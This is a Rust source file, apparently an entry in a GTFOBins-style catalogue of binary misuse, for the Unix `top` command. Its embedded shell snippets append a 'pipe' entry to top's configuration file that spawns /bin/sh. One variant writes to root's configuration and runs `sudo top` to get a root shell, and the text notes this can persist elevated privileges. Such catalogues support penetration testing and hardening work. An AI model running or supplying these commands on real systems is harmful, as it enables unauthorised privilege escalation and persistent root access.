pub static BIN_NAME: &'static str = "top";
pub static BIN_DESC: &'static str = "This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.";
pub static SH_CODE: &'static str = r#"
    
    echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
    top
    # press return twice
    reset
"#;
pub static SUDO_DESC: &'static str = "This requires that the root configuration file is writable and might be used to persist elevated privileges.";
pub static SUDO_CODE: &'static str = r#"
    
    echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
    sudo top
    # press return twice
    reset
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
